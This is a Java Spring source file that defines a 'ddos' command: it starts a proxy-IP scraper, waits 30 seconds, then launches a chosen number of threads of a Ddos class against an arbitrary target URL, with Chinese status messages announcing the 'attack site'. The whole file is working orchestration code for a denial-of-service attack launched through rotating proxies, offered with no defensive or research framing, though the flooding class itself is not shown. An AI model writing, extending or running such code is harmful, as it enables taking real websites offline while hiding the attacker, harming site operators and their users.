package com.video.data.command;

import com.video.data.annotations.Command;
import com.video.data.command.model.ReturnMsg;
import com.video.data.ddos.Ddos;
import com.video.data.ddos.proxy.ProxyMonitoring;
import org.springframework.stereotype.Service;

@Command("ddos")
@Service
public class DdosCommand implements BaseCommandI {

    @Override
    public ReturnMsg run(String... args) {
        ReturnMsg returnMsg = new ReturnMsg();
        System.setProperty("https.protocols", "TLSv1.1,TLSv1.2");
        String url = args[1];
        int threadNum = Integer.parseInt(args[2]);
        returnMsg.success("启动代理IP抓取程序");
        returnMsg.success("查看当前代理IP状态地址：http://localhost:8090/ip/list");
        Thread thread1 = new Thread(new ProxyMonitoring());
        thread1.start();
        returnMsg.success("30秒后将会启动攻击程序");
        try {
            Thread.sleep(30000);
        } catch (InterruptedException ignored) {}
        returnMsg.success("启动" + threadNum + "个线程");
        returnMsg.success("攻击站点：" + url);
        for (int i = 0; i < threadNum; i++) {
            Ddos ddos = new Ddos();
            ddos.setUrl(url);
            Thread thread = new Thread(ddos);
            thread.start();
        }
        return returnMsg;
    }
}
